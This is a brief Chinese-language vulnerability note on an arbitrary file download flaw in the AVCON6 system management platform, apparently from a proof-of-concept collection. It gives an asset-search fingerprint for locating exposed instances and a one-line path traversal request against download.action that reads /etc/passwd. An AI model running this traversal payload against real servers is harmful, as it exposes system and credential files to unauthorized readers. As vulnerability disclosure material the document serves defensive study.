# AVCON6 系统管理平台 download.action 任意文件下载漏洞

## 漏洞描述

AVCON6 系统管理平台 download.action 存在任意文件下载漏洞，攻击者通过漏洞可以下载服务器任意文件

## 漏洞影响

```
AVCON6 系统管理平台
```

## 网络测绘

```
app="AVCON-6"
```

## 漏洞复现

登录页面

![img](./images/202202101910735.png)

验证POC

```php
/download.action?filename=../../../../../../etc/passwd
```

![img](./images/202202101910750.png)